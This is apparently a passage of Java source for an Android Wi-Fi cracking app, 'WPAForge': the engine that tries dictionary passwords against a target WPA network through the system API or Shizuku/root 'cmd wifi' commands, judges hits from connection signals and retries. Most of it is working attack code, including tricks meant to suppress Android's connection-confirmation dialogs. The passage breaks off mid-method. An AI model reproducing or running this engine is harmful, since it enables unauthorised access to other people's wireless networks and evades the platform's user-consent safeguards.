package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;
import io.github.wlmosv_png.wpaforge.Prefs;
import io.github.wlmosv_png.wpaforge.core.NetRecord;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSpecifier;
import android.os.Build;
import android.os.SystemClock;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 唯一的破解引擎。
 *
 * <h3>为什么要收敛成一个引擎</h3>
 * 之前三种模式各有各的实现，各有各的判定，结果就是
 * 「同一个 bug 要在三个地方修，还修不全」—— 事实也证明了这一点：
 * 双重 onFinished、配置复用假阳性，两个 bug 都同时存在于两条通道里。
 *
 * 现在所有通道共用同一套：
 * <ul>
 *   <li>同一套 {@link Verdict} 语义</li>
 *   <li>同一套「多信号综合判定」</li>
 *   <li>同一套重试/超时/取消策略</li>
 * </ul>
 * 通道只负责「把一条候选发出去」，判定完全由引擎做。
 *
 * <h3>多信号综合判定（这是修「跳过正确答案」的关键）</h3>
 * 单一信号都不可靠：
 * <pre>
 *   cmd wifi status 文本   可能被截断、格式随版本变
 *   onAvailable 回调       某些 ROM 会因为别的网络触发
 *   WifiInfo.getSSID()     Android 10+ 受限，更新有延迟
 * </pre>
 * 所以判定同时看**三个信号**，任一确认即成功，全部否才判失败：
 * <ol>
 *   <li>通道回调（requestNetwork 的 onAvailable）</li>
 *   <li>WifiInfo 的当前 SSID</li>
 *   <li>cmd wifi status 文本（有 shell 通道时）</li>
 * </ol>
 *
 * <h3>对外用法</h3>
 * <pre>
 *   CrackEngine engine = new CrackEngine(ctx, Prefs.MODE_SHIZUKU);
 *   engine.run(target, candidates, startOffset, listener);
 * </pre>
 * 引擎自己决定走哪个通道，调用方不需要知道。
 */
public final class CrackEngine {

    private static final String TAG = "WPAForgeEngine";

    // ------------------------------------------------------------------ 结果

    /** 单条候选的结论 */
    public enum Verdict {
        /** 系统确认连上 → 密码正确 */
        SUCCESS,
        /** 系统尝试后失败 → 密码错误 */
        AUTH_FAIL,
        /** 超时，没等到结论 → **不判成功** */
        TIMEOUT,
        /** 目标不在扫描范围 → 这条无意义 */
        TARGET_GONE,
        /**
         * 当前确实连着目标，但**无法确认是不是这条候选造成的**。
         *
         * 例如：开跑前就连着、或者上一条的连接还没断开。
         * 这种状态**不能算命中** —— 否则任何密码都会在第一条被误报成功。
         */
        UNKNOWN,
        /** 通道出错 */
        ERROR,
        /** 用户停止 */
        ABORTED
    }

    public static final class Attempt {
        public final String password;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;
        /** 哪一个信号确认的（排查用） */
        public final String confirmedBy;

        Attempt(String password, Verdict v, long ms, String detail, String confirmedBy) {
            this.password = password;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
            this.confirmedBy = confirmedBy == null ? "" : confirmedBy;
        }

        public boolean isSuccess() { return verdict == Verdict.SUCCESS; }
    }

    /** 进度回调 */
    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt a);
        void onProgress(int tested, int total, double rate, long etaMs);
        default void onLog(String line) { }
        void onFinished(int tested, int total, String hitPassword, String outcome);
        void onBlocked(String title, String detail);
    }

    // ------------------------------------------------------------------ 成员

    private final Context appCtx;
    private final WifiManager wifi;
    private final ConnectivityManager cm;
    private final int mode;

    /**
     * （已弃用）曾经用作"判为成功的最短耗时"。
     *
     * 移除原因：它误杀了快速连接。
     * 归因已经由「事件必须发生在命令之后」保证，再加时间门槛是多余且有害的。
     * 保留常量只为兼容历史测试，实际判定不再使用。
     */
    @Deprecated
    private static final long MIN_HIT_MS = 0L;

    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);

    /**
     * 连接事件监听器 —— **判定层的唯一真值来源**。
     *
     * 不再轮询 `WifiInfo` / 解析 `cmd wifi status` 文本，
     * 而是让系统在网络可用的**那一刻**主动通知我们。
     */
    private NetworkWatcher watcher;

    /** shell 通道（Shizuku/Root），null 表示走系统 API */
    private ShellChannel shell;

    /** 通道测速：连续 N 条都超时，说明这个通道在当前环境跑不动 */
    private int consecutiveTimeouts = 0;

    /** 日志检查用计数器（每 5 轮查一次，避免频繁起进程） */
    private int logCheckCounter = 0;
    private static final int TIMEOUT_ALERT = 5;

    public CrackEngine(Context ctx, int mode) {
        this.appCtx = ctx.getApplicationContext();
        this.watcher = new NetworkWatcher(appCtx);
        this.wifi = (WifiManager) appCtx.getSystemService(Context.WIFI_SERVICE);
        this.cm = (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.mode = mode;
    }

    // ------------------------------------------------------------------ 通道

    /** shell 通道抽象（Shizuku / Root 共用一个接口） */
    public interface ShellChannel {
        String exec(String cmd, long timeoutMs);
        void forgetTarget(String ssid);
        String name();
    }

    public void setShellChannel(ShellChannel ch) {
        this.shell = ch;
    }

    /**
     * 供「连接自测」用：对指定 SSID+密码跑一次完整判定。
     *
     * 与正式破解走同一条路径（tryOne），只是 SSID 和密码由界面直接给出。
     */
    public Attempt tryOneForTest(String ssid, String password, long timeoutMs) {
        io.github.wlmosv_png.wpaforge.core.NetRecord t =
                new io.github.wlmosv_png.wpaforge.core.NetRecord(
                        ssid, "", 0, 2437,
                        io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2,
                        false, "");
        return tryOne(t, "wpa2", password, timeoutMs);
    }

    /** 供界面做环境诊断时取当前通道（可能为 null）。 */
    public ShellChannel getShellChannelForDiag() {
        return shell;
    }

    // ------------------------------------------------------------------ 前置检查

    public static final class CheckResult {
        public final boolean ok;
        public final String title;
        public final String detail;
        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail == null ? "" : detail;
        }
    }

    /** 引擎在当前模式下能不能跑 */
    public CheckResult check() {
        if (mode == Prefs.MODE_NO_ROOT) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                return new CheckResult(false,
                        L.s("系统版本过低", "Android version too old"),
                        L.s("免 Root 精确连接需要 Android 10+。\n这台设备只能用 Root 模式。",
                            "Precise root-free connection needs Android 10+.\nOnly root mode is available here."));
            }
            if (cm == null) {
                return new CheckResult(false,
                        L.s("无法访问连接管理服务", "Cannot access ConnectivityManager"),
                        L.s("系统没有提供 ConnectivityManager。", "The system exposed no ConnectivityManager."));
            }
        }
        if (wifi == null) {
            return new CheckResult(false,
                    L.s("无法访问 WiFi 服务", "Cannot access the Wi-Fi service"),
                    L.s("系统没有提供 WifiManager。", "The system exposed no WifiManager."));
        }
        if (!wifi.isWifiEnabled()) {
            return new CheckResult(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    L.s("请先打开 WiFi 开关再试。", "Turn Wi-Fi on first."));
        }
        return new CheckResult(true, "", "");
    }

    // ------------------------------------------------------------------ 判定核心

    /**
     * 当前是不是真的连着目标。
     *
     * 三个信号任一确认即算，返回确认者的名字；都不确认返回 null。
     * 这个方法是整个引擎可靠性的关键 —— 单看任何一个都会误判。
     */
    private String connectedSignal(String targetSsid, String statusOut) {
        // 信号 1：WifiInfo
        String cur = currentSsid();
        if (cur != null && cur.equals(targetSsid)) return "WifiInfo";

        // 信号 2：cmd wifi status 文本
        if (statusOut != null && statusOut.contains("connected to \"" + targetSsid + "\"")) {
            return "cmd-status";
        }

        return null;
    }

    /**
     * 把 CHANGE_WIFI_STATE 的操作登记为本应用发起。
     *
     * 这是「减少系统弹窗」的一环：系统在决定要不要弹确认框时，
     * 会看这次 Wi-Fi 操作是谁发起的、有没有走应用自己的前台界面。
     * 用 AppOps 标记之后，部分 ROM（含 ColorOS）会直接静默处理。
     *
     * 失败不影响功能，只是弹窗可能还在。
     */
    /** change_wifi_state 的 AppOps 名（字符串常量，避免不同版本字段缺失） */
    private static final String OP_CHANGE_WIFI = "android:change_wifi_state";

    private void noteAppOpAllow() {
        try {
            android.app.AppOpsManager ops = (android.app.AppOpsManager)
                    appCtx.getSystemService(Context.APP_OPS_SERVICE);
            if (ops == null) return;
            // 不同版本方法名不同，逐个试
            try {
                ops.noteOp(OP_CHANGE_WIFI,
                        android.os.Process.myUid(), appCtx.getPackageName());
            } catch (Throwable t1) {
                try {
                    java.lang.reflect.Method m = android.app.AppOpsManager.class
                            .getMethod("noteOpNoThrow", String.class, int.class, String.class);
                    m.invoke(ops, OP_CHANGE_WIFI,
                            android.os.Process.myUid(), appCtx.getPackageName());
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    /** 当前 SSID（已去引号） */
    private String currentSsid() {
        // **优先走 shell 的 `cmd wifi status`。**
        //
        // 缺定位权限时，App 侧的 `WifiInfo.getSSID()` 永远返回
        // `<unknown ssid>`。而这里的返回值被大量判定与防护逻辑用到：
        //   · 基线断开确认（disconnectAndVerify）
        //   · 命令前 SSID（ssidBefore）
        //   · 判据 D
        // 一旦恒为 null，这些防护会**静默失效**（例如「命令前不是目标」
        // 会被判成成立），假阳性就从这里漏出来。
        // shell 侧不受定位权限影响，读得到就读它。
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    String cur = StatusParser.currentSsid(st);
                    if (cur != null && !"<unknown ssid>".equals(cur)) return cur;
                    // status 明确说没连，就直接返回 null，不要再退回 App API
                    if (st.contains("Wifi is not connected")) return null;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return null;
            WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return null;
            String cur = info.getSSID();
            if (cur == null) return null;
            if (cur.length() >= 2 && cur.startsWith("\"") && cur.endsWith("\"")) {
                cur = cur.substring(1, cur.length() - 1);
            }
            if ("<unknown ssid>".equals(cur)) return null;
            return cur;
        } catch (Throwable t) {
            return null;
        }
    }

    // ------------------------------------------------------------------ 连接状态与基线

    /**
     * 当前是否连着某个网络（返回 SSID，没连返回 null）。
     *
     * 注意：这里读的是**系统级的当前连接**，它可能是：
     *   · 用户自己连的
     *   · 上一条候选留下的
     *   · 本条候选刚建立的
     * 单看这个值**无法区分**，所以不能直接当命中依据。
     */
    private String snapshotSsid() {
        return currentSsid();
    }

    /**
     * 解析 `cmd wifi status` 输出，判断当前是否连着目标、以及 netId。
     * 实现已抽到 {@link StatusParser}（纯逻辑，可离线测试）。
     */
    public static long[] parseStatusFor(String statusOut, String ssid) {
        StatusParser.Result r = StatusParser.parse(statusOut, ssid);
        return new long[]{r.onTarget ? 1 : 0, r.netId};
    }

    /**
     * 当前连接的 netId。
     *
     * **优先走 shell 的 `cmd wifi status`**：App 侧的
     * `WifiInfo.getNetworkId()` 在「正在连接」状态下会返回 -1 或过期的值，
     * 而判定恰恰最需要在那一刻拿到真实 netId（用来确认是不是本次新建的配置）。
     * shell 拿不到时才退回本地 API。
     */
    private long currentNetId() {
        if (shell != null) {
            try {
                String st = shell.exec("cmd wifi status", 5000);
                if (st != null && !st.trim().isEmpty()) {
                    long id = StatusParser.parse(st, null).netId;
                    if (id >= 0) return id;
                }
            } catch (Throwable ignored) {}
        }
        try {
            if (wifi == null) return -1;
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            if (info == null) return -1;
            int id = info.getNetworkId();
            return id < 0 ? -1 : id;
        } catch (Throwable t) {
            return -1;
        }
    }

    /**
     * 引擎自带的「删净目标配置」实现。
     *
     * 不依赖外部传入的 {@link ShellChannel#forgetTarget} —— 那个实现在
     * 不同调用方（前台服务 / 自检 / 连接自测）里有的做了回读校验、
     * 有的干脆是空实现，行为不一致。判定依赖「配置确实被清掉」，
     * 所以统一收在这里，谁调都一样。
     *
     * @return true = 确认已清干净
     */
    private boolean forgetTargetByShell(String ssid) {
        if (shell == null || ssid == null) return false;
        for (int round = 0; round < 3; round++) {
            long leftover = -1;
            try {
                String out = shell.exec("cmd wifi list-networks", 5000);
                if (out == null) return false;
                for (String line : out.split("\n")) {
                    Long id = parseNetIdLine(line, ssid);
                    if (id != null) { leftover = id; break; }
                }
            } catch (Throwable ignored) {
                return false;
            }
            if (leftover < 0) return true;
            try { shell.exec("cmd wifi forget-network " + leftover, 4000); }
            catch (Throwable ignored) {}
            sleep(400);
        }
        return netIdOfTarget(ssid) < 0;
    }

    /**
     * 查目标是本次新建网络的 netId（命令后用）。
     *
     * `cmd wifi connect-network` 会把目标写进已保存列表，
     * 命令后查到的 netId 就是**本次**配置的净标识。
     * 用它和 status 里的 Net ID 比对，就能把「连上了目标」归因到「这条候选」。
     */
    private long netIdOfTarget(String ssid) {
        if (shell == null || ssid == null || ssid.isEmpty()) return -1;
        try {
            String out = shell.exec("cmd wifi list-networks", 5000);
            if (out == null) return -1;
            for (String line : out.split("\n")) {
                Long id = parseNetIdLine(line, ssid);
                if (id != null) return id;
            }
        } catch (Throwable ignored) {}
        return -1;
    }

    /**
     * 从 `cmd wifi list-networks` 的一行里解析出 netId。
     * 实现已抽到 {@link ListNetworksParser}（纯逻辑，可离线测试）。
     */
    public static Long parseNetIdLine(String line, String ssid) {
        return ListNetworksParser.netIdOfLine(line, ssid);
    }

    /**
     * 断开当前连接，并确认真的断开了。
     *
     * 这是「基线」步骤：只有基线是「未连接目标」，
     * 后面的「连上了」才有意义。
     */
    private boolean disconnectAndVerify(String targetSsid) {
        // 先用本地 API
        try {
            if (wifi != null) wifi.disconnect();
        } catch (Throwable ignored) {}

        // **不能一看到“不是目标”就算断开成功**。
        // 断开瞬间 SSID 会变成 null / <unknown>，但系统可能马上又自动连回去（
        // 已保存的配置还在）。要“持续一段时间都没连目标”才能认。
        long stableSince = -1;
        for (int i = 0; i < 40; i++) {          // 最长 12 秒
            String cur = snapshotSsid();
            boolean off = (cur == null || !cur.equals(targetSsid));
            if (off) {
                if (stableSince < 0) stableSince = SystemClock.uptimeMillis();
                // 连续 3 秒未连目标 → 认为基线稳定
                if (SystemClock.uptimeMillis() - stableSince >= 3000) return true;
            } else {
                stableSince = -1;
            }
            sleep(300);
        }

        // 本地 API 不生效就走 shell（有通道的话）
        if (shell != null) {
            try { shell.exec("cmd wifi set-wifi-enabled disabled", 5000); } catch (Throwable ignored) {}
            sleep(1200);
            try { shell.exec("cmd wifi set-wifi-enabled enabled", 5000); } catch (Throwable ignored) {}
            for (int i = 0; i < 15; i++) {
                String cur = snapshotSsid();
                if (cur == null || !cur.equals(targetSsid)) return true;
                sleep(400);
            }
        }
        return false;
    }

    // ------------------------------------------------------------------ 通道自检

    /** 接入自检结果 */
    public static final class ChannelProbe {
        public final boolean ok;
        public final String summary;
        public final String detail;
        /** 逐项检查结果，给用户看细节 */
        public final java.util.List<String> steps = new java.util.ArrayList<>();

        ChannelProbe(boolean ok, String summary, String detail) {
            this.ok = ok;
            this.summary = summary == null ? "" : summary;
            this.detail = detail == null ? "" : detail;
        }

        /** 连同已收集的步骤一起构造。
         *
         * 之前 probeChannel 里先在临时对象上 step()，最后 new 了一个新对象返回 ——
         * detail（字符串）带过去了，但 steps（列表）留在了临时对象上，
         * 于是日志里出现「结论有、检查项 0 条」的怪现象。
         */
        ChannelProbe(boolean ok, String summary, String detail, java.util.List<String> from) {
            this(ok, summary, detail);
            if (from != null) this.steps.addAll(from);
        }

        void step(String s) { steps.add(s); }
    }

    /**
     * 检查当前通道是不是真的接入了。
     *
     * 这是用户要求的「完全判定」：不看界面写着什么，
     * 而是**实际跑一遍判定链**，每一步都留证据。
     *
     * <p>为什么必须做这个：用户看到的「执行方式: Shizuku」只是 prefs 里
     * 存的一个数字，跟通道是否真的可用完全无关。之前没有自检，
     * 通道断了也照跑，跑完 97 条全是「未连上」，用户以为密码不对。
     */
    public ChannelProbe probeChannel() {
        ChannelProbe p = new ChannelProbe(true, "", "");

        // --- 1. WiFi 开关 ---
        boolean wifiOn = false;
        try { wifiOn = wifi != null && wifi.isWifiEnabled(); } catch (Throwable ignored) {}
        p.step((wifiOn ? "✓ " : "✗ ") + L.s("WiFi 开关: ", "Wi-Fi enabled: ")
                + (wifiOn ? L.s("开", "on") : L.s("关", "off")));
        if (!wifiOn) {
            p.step(L.s("  → 请先打开 WiFi", "  -> turn Wi-Fi on first"));
            return new ChannelProbe(false,
                    L.s("WiFi 未开启", "Wi-Fi is off"),
                    join(p), p.steps);
        }

        // --- 2. 通道类型 ---
        if (mode == Prefs.MODE_NO_ROOT) {
            p.step("✓ " + L.s("通道: 系统精确连接（不需要 shell）",
                    "channel: system precise request (no shell needed)"));
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                p.step("✗ " + L.s("需要 Android 10+", "needs Android 10+"));
                return new ChannelProbe(false,
                        L.s("系统版本过低", "Android version too old"), join(p), p.steps);
            }
            if (cm == null) {
                p.step("✗ " + L.s("拿不到 ConnectivityManager", "no ConnectivityManager"));
                return new ChannelProbe(false,
                        L.s("系统服务缺失", "system service missing"), join(p), p.steps);
            }
            // 读当前连接作为一次实读
            String cur = currentSsid();
            p.step((cur != null ? "✓ " : "· ") + L.s("当前连接读取: ", "current SSID read: ")
                    + (cur == null ? L.s("读不到（正常，可能没连）", "n/a (may be disconnected)") : cur));
            return new ChannelProbe(true, L.s("免 Root 通道可用", "root-free channel ready"), join(p), p.steps);
        }

        // --- 3. shell 通道 ---
        if (shell == null) {
            p.step("✗ " + L.s("shell 通道未设置", "shell channel not set"));
            return new ChannelProbe(false,
                    L.s("通道未接入", "channel not attached"),
                    join(p) + "\n" + L.s("这是程序内部错误，请反馈。",
                            "This is an internal error; please report it."));
        }
        p.step("✓ " + L.s("通道类型: ", "channel type: ") + shell.name());

        // 真跑一条，看能不能执行
        String out = null;
        long t0 = SystemClock.uptimeMillis();
        try {
            out = shell.exec("cmd wifi status", 8000);
        } catch (Throwable t) {
            p.step("✗ " + L.s("执行命令抛异常: ", "exec threw: ") + t.getClass().getSimpleName());
        }
        long cost = SystemClock.uptimeMillis() - t0;

        if (out == null) {
            p.step("✗ " + L.s("命令没有返回（通道断了或未授权）",
                    "command returned nothing (channel down or not granted)"));
            p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "「执行方式」里显示的模式只是设置项，不代表通道可用。\n"
                                    + "请到设置页点那行状态重新检测，或重新授予 Shizuku 权限。",
                            "The mode shown in Settings is just a preference; it does not mean "
                                    + "the channel works. Re-check the status line on the Settings page, "
                                    + "or re-grant Shizuku permission."));
        }

        String trimmed = out.trim();
        if (trimmed.isEmpty()) {
            p.step("✗ " + L.s("命令返回空（通道没真正执行）",
                    "command returned empty (channel did not actually run)"));
            return new ChannelProbe(false,
                    L.s("通道未真正接入", "channel is not actually attached"),
                    join(p) + "\n\n" + L.s(
                            "常见原因：Shizuku 未授权本应用，或服务已停止。",
                            "Common causes: Shizuku has not granted this app, or the service stopped."));
        }

        boolean looksLikeWifi = trimmed.contains("Wifi") || trimmed.contains("Wi-Fi")
                || trimmed.contains("wlan") || trimmed.contains("connected");
        p.step((looksLikeWifi ? "✓ " : "? ") + L.s("命令返回看起来像 WiFi 输出", "output looks like Wi-Fi status"));
        p.step("  " + L.s("耗时 ", "took ") + cost + "ms");
        if (!looksLikeWifi) {
            p.step("  " + L.s("首行: ", "first line: ") + firstLine(trimmed));
        }

        // --- 4. 判定信号可用性 ---
        String cur = currentSsid();
        p.step((cur != null ? "✓ " : "· ") + L.s("WifiInfo 信号: ", "WifiInfo signal: ")
                + (cur == null ? L.s("读不到", "unavailable") : cur));
        boolean cmdSignal = trimmed.contains("connected to \"");
        p.step((cmdSignal ? "✓ " : "· ") + L.s("cmd-status 信号: ",
                "cmd-status signal: ")
                + (cmdSignal ? L.s("可用（当前已连着网络）", "usable (connected now)")
                             : L.s("当前没连网络，连上后才有", "no network connected right now")));

        if (cur == null && !cmdSignal) {
            p.step(L.s("  ⚠ 两个判定信号当前都读不到值。",
                    "  ! both verdict signals read nothing right now."));
            p.step(L.s("    这不一定是故障（可能只是当前没连网），",
                    "    This is not necessarily a fault (you may just be offline),"));
            p.step(L.s("    但如果跑完所有候选都没命中，请先怀疑这里。",
                    "    but if every candidate misses, suspect this first."));
        }

        if (cost > 5000) {
            p.step(L.s("  ⚠ 命令较慢，判定会拖时间（不影响正确性）",
                    "  ! command is slow; verdicts will lag (correctness unaffected)"));
        }

        // **慢不等于不可用**。
        // 之前用「cost < 5000」当门槛，会把能用但慢的机器误判成未接入 ——
        // 那是把可用性判据和性能判据混在一起了，是错的。
        // 现在只看：命令能不能执行、返回内容像不像 WiFi 输出。
        boolean ok = looksLikeWifi;
        String summary;
        if (!ok) {
            summary = L.s("通道返回内容异常", "channel returned unexpected output");
        } else if (cost > 8000) {
            summary = L.s("通道已接入（较慢）", "channel attached (slow)");
        } else {
            summary = L.s("通道已接入", "channel attached");
        }
        return new ChannelProbe(ok, summary, join(p), p.steps);
    }

    private static String join(ChannelProbe p) {
        StringBuilder sb = new StringBuilder();
        for (String s : p.steps) sb.append(s).append('\n');
        return sb.toString().trim();
    }

    private static String firstLine(String s) {
        int i = s.indexOf('\n');
        String line = i > 0 ? s.substring(0, i) : s;
        return line.length() > 80 ? line.substring(0, 80) + "..." : line;
    }

    // ------------------------------------------------------------------ 单条尝试

    /**
     * 试一条。阻塞，放工作线程。
     *
     * 不管走哪个通道，判定都在这里统一做。
     */
    public Attempt tryOne(NetRecord target, String security, String password, long timeoutMs) {
        long t0 = SystemClock.uptimeMillis();

        if (password == null || password.length() < 8 || password.length() > 63) {
            return new Attempt(password, Verdict.AUTH_FAIL,
                    SystemClock.uptimeMillis() - t0,
                    L.s("长度不合法（WPA 要求 8-63）", "illegal length (WPA needs 8-63)"), "");
        }

        if (mode == Prefs.MODE_NO_ROOT) {
            return tryOnePrecise(target, password, timeoutMs, t0);
        } else {
            return tryOneShell(target, security, password, timeoutMs, t0);
        }
    }

    /**
     * 把 requestNetwork 的异常翻译成「怎么办」。
     *
     * Android 13+ 用 WifiNetworkSpecifier 连 WiFi 有一堆前置条件，缺任何一条
     * 都抛 SecurityException，光看类型根本不知道差什么。这里逐项查一遍。
     */
    private String describeRequestNetworkFailure(Throwable t) {
        StringBuilder sb = new StringBuilder();
        String cls = t.getClass().getSimpleName();
        sb.append(L.s("发起请求失败: ", "requestNetwork failed: ")).append(cls);

        if (t instanceof SecurityException) {
            sb.append('\n').append(L.s("原因排查:", "Possible causes:"));
            // 目标 SDK 越高，系统检查越严
            sb.append('\n').append("  · targetSdk=").append(appCtx.getApplicationInfo().targetSdkVersion);
            sb.append("  · Android ").append(Build.VERSION.RELEASE)
              .append(" (API ").append(Build.VERSION.SDK_INT).append(')');

            // 定位权限
            boolean fine = appCtx.checkSelfPermission(
                    android.Manifest.permission.ACCESS_FINE_LOCATION)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
            sb.append('\n').append("  · 定位权限: ").append(fine ? "有" : "缺（必须授予）");

            // 附近设备权限（API 33+）
            if (Build.VERSION.SDK_INT >= 33) {
                boolean nearby = appCtx.checkSelfPermission(
                        "android.permission.NEARBY_WIFI_DEVICES")
                        == android.content.pm.PackageManager.PERMISSION_GRANTED;
                sb.append('\n').append("  · 附近设备权限: ").append(nearby ? "有" : "缺（必须授予）");
            }

            // 系统定位开关 —— 这是最常被忽略的一条
            boolean locOn = false;
            try {
                android.location.LocationManager lm = (android.location.LocationManager)
                        appCtx.getSystemService(Context.LOCATION_SERVICE);
                locOn = lm != null && lm.isLocationEnabled();
            } catch (Throwable ignored) {}
            sb.append('\n').append("  · 系统定位开关: ")
              .append(locOn ? "开" : "**关**（Android 要求打开定位才能用 WiFi 连接 API）");

            sb.append('\n').append(L.s(
                    "  → 免 Root 模式在 Android 13+ 限制极多（必须前台、定位开启、"
                            + "且每次连接都会弹系统确认框，无法做字典遍历）。",
                    "  -> root-free mode is heavily restricted on Android 13+."));
            sb.append('\n').append(L.s(
                    "  → 强烈建议改用 Shizuku 模式（装 Shizuku 应用并启动服务，"
                            + "不需要 root），或 Root 模式。",
                    "  -> strongly recommend Shizuku mode instead."));
        }
        return sb.toString();
    }

    /** 免 Root：requestNetwork + 回调 */
    private Attempt tryOnePrecise(NetRecord target, String password, long timeoutMs, long t0) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicInteger outcome = new AtomicInteger(0); // 0未定 1成功 2失败

        WifiNetworkSpecifier spec;
        try {
            spec = new WifiNetworkSpecifier.Builder()
                    .setSsid(target.ssid)
                    .setWpa2Passphrase(password)
                    .build();
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("构建请求失败: ", "specifier failed: ") + t.getClass().getSimpleName(), "");
        }

        NetworkRequest req = new NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                // 关键：不要 INTERNET 能力。
                // 带上它系统会认为你要「上网」，于是必须让你确认；
                // 去掉之后语义是「我只是想连上这个 AP」，弹窗明显减少。
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_TRUSTED)
                .removeCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
                .setNetworkSpecifier(spec)
                .build();

        // 把这次操作登记成「应用自己发起的」，走静默路径
        noteAppOpAllow();

        final ConnectivityManager.NetworkCallback cb = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network n) {
                // 不完全相信 onAvailable：还要 SSID 对得上
                String by = null;
                for (int i = 0; i < 12 && by == null; i++) {
                    if (cancelFlag.get()) break;
                    by = connectedSignal(target.ssid, null);
                    if (by == null) {
                        try { Thread.sleep(150); } catch (InterruptedException e) { break; }
                    }
                }
                outcome.set(by != null ? 1 : 2);
                latch.countDown();
            }
            @Override public void onUnavailable() {
                outcome.set(2);
                latch.countDown();
            }
            @Override public void onLost(Network n) {
                if (latch.getCount() > 0) { outcome.set(2); latch.countDown(); }
            }
        };

        try {
            cm.requestNetwork(req, cb);
        } catch (Throwable t) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    describeRequestNetworkFailure(t), "");
        }

        try {
            long deadline = SystemClock.uptimeMillis() + timeoutMs;
            while (SystemClock.uptimeMillis() < deadline) {
                if (cancelFlag.get() || pauseFlag.get()) {
                    return new Attempt(password, Verdict.ABORTED,
                            SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
                }
                if (latch.await(200, TimeUnit.MILLISECONDS)) break;
            }
            long ms = SystemClock.uptimeMillis() - t0;
            if (latch.getCount() > 0) {
                return new Attempt(password, Verdict.TIMEOUT, ms,
                        L.s("超时（系统未给出结论）", "timeout (no verdict)"), "");
            }
            return outcome.get() == 1
                    ? new Attempt(password, Verdict.SUCCESS, ms, L.s("已连上", "connected"), "callback+ssid")
                    : new Attempt(password, Verdict.AUTH_FAIL, ms, L.s("未连上", "not connected"), "");
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            return new Attempt(password, Verdict.ABORTED,
                    SystemClock.uptimeMillis() - t0, L.s("已中断", "interrupted"), "");
        } finally {
            try { cm.unregisterNetworkCallback(cb); } catch (Throwable ignored) {}
        }
    }

    /**
     * Root / Shizuku：发连接命令，**判定只认 NetworkWatcher 的事件**。
     *
     * <h3>为什么推倒重来</h3>
     * 旧实现轮询 `WifiInfo` / 解析 `cmd wifi status`，叠了三层防护仍然误报：
     * <pre>
     *   基线检查  → 断开瞬间 SSID 变 null，被判"已清空"，其实系统马上回连
     *   物理下限  → 3 秒，系统回连有时恰好越过
     *   SSID 匹配 → 只说明"现在连着谁"，不说明"是谁连的"
     * </pre>
     * 根子上是因为**从来没有拿到过一个可信的"连上了"事件**。
     *
     * <h3>现在怎么判</h3>
     * {@link NetworkWatcher} 注册系统回调，在网络可用的**那一刻**记录事件。
     * 判定只问一个问题：
     * <pre>
     *   发出这条候选（commandAt）之后，
     *   系统有没有报告过目标 SSID「变为可用」？
     * </pre>
     * 之前就连着、或者中途系统自己回连且发生在 commandAt 之前 —— 都不算。
     * 这个判据不依赖文本解析，也不依赖轮询时机。
     */
    private Attempt tryOneShell(NetRecord target, String security, String password,
                                long timeoutMs, long t0) {
        if (shell == null) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
        }

        // 每条之前删净旧配置（配置复用会让任何密码都"成功"）。
        // 走引擎自带实现，保证各调用方行为一致。
        if (!forgetTargetByShell(target.ssid)) {
            return new Attempt(password, Verdict.UNKNOWN,
                    SystemClock.uptimeMillis() - t0,
                    L.s("无法清除旧配置，本条结果不可信",
                        "could not clear stale config; this attempt is unreliable"),
                    "");
        }

        // **净检：确认目标配置真的没了**。
        //
        // 这是防「假阳性」的第一道闸。实机出现过 4 个不同网络都在第 1 条
        // password 就"已破解"——根因就是旧配置没清掉，系统拿已保存的
        // 正确密码（或 PMKSA 缓存）连上了，跟候选本身毫无关系。
        //
        // 做法：回读 list-networks，目标只要还挂着 netId，本条就不可能有
        // 可信结论 —— 直接判 UNKNOWN，不让它污染结果。
        long staleNetId = netIdOfTarget(target.ssid);
        if (staleNetId >= 0) {
            return new Attempt(password, Verdict.UNKNOWN,
                    SystemClock.uptimeMillis() - t0,
                    L.s("旧配置未清除（netId=" + staleNetId + "），本条结果不可信",
                        "stale config not cleared (netId=" + staleNetId
                                + "); this attempt is unreliable"),
                    "");
